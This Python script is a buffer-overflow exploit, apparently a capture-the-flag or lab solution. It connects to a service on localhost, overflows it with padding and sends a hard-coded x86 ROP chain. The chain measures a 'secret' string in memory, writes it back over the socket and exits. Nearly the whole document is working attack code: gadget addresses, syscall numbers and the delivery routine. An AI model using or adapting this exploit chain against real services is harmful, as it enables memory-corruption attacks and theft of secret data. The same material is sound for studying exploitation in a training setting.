#!/usr/bin/env python

from struct import pack
from console import console
import socket
import sys
import time
import os

if len(sys.argv) != 2:
   	sys.exit("Usage: %s PORT" % sys.argv[0])

def send_cmd(cmd1, cmd2):
    	port = int(sys.argv[1])
    	sock = socket.create_connection(('127.0.0.1', port),
                                    	socket.getdefaulttimeout(),
                                    	('127.0.0.1', 0))

    	sock.sendall(cmd1)
 	time.sleep(1)
    	sock.sendall(cmd2)
	
    	while True:
    		buf = sock.recv(1024)
    	        if not buf:
   		       break
    		sys.stdout.write(buf)
  		sys.stdout.flush()
    	
	sock.close()

#first command of 1023 chars
cmd1 = ""
pad = "a"

for x in range(0, 1023):
	cmd1 = "".join((cmd1, pad))

#second command of 29 to reach 1052 and start writing first gadget's address
p = ""

for x in range(0, 29):
	p = "".join((p, pad))

#StringLength gadget computes length of [ecx]
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0)	    # 0
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08076ce5) # pop esi ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139ea8) # &secret
p += pack('<I', 0x080a3420) # mov ecx, dword ptr [ecx] ; mov dword [edx], ecx ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0xffffffd8) # JUMP_SIZE = -40
p += pack('<I', 0x0804834b) # pop edi ; ret
p += pack('<I', 0x0) 	    # 0
p += pack('<I', 0x0808d7c5) # inc edi ; ret
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x08127ded) # cmp byte ptr [ecx], al ; ret
p += pack('<I', 0x0809c909) # cmovne eax, edx ; ret
p += pack('<I', 0x080485f4) # pop ebp ; ret
p += pack('<I', 0x0)        # 0
p += pack('<I', 0x08127bb6) # inc ecx ; ret
p += pack('<I', 0x0807c05f) # add ebp, eax ; retf
p += pack('<I', 0x0812c918) # add esp, ebp ; add cl, byte ptr [esi] ; adc al, 0x43 ; ret
p += pack('<I', 0x00000023) # 23

#adding new line after decreasing ecx
p += pack('<I', 0x080545a1) # dec ecx ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x0000000a) # \n
p += pack('<I', 0x080a9840) # mov byte ptr [ecx], dl ; pop ebx ; ret
p += pack('<I', 0xdedcacca) # garbage

#dup
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x0)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x29)	    # 0x29 <-> dup
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#close
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x0)
p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x06)	    # 6
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#ebx has sock+1
p += pack('<I', 0x08134226) # dec ebx ; ret

#write
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139ea8) # &secret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080a3420) # mov ecx, dword ptr [ecx] ; mov dword [edx], ecx ; ret
p += pack('<I', 0x080a0a75) # mov edx, edi ; pop esi ; pop edi ; pop ebp ; ret
p += pack('<I', 0xdedcacca) # garbage
p += pack('<I', 0xdedcacca) # garbage
p += pack('<I', 0xdedcacca) # garbage
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x4)	    # 0x4 <-> write
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#exit
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x0)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x1)	    # 0x1 <-> exit
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

send_cmd(cmd1, p)

# :vim set sw=4 ts=8 sts=8 expandtab:
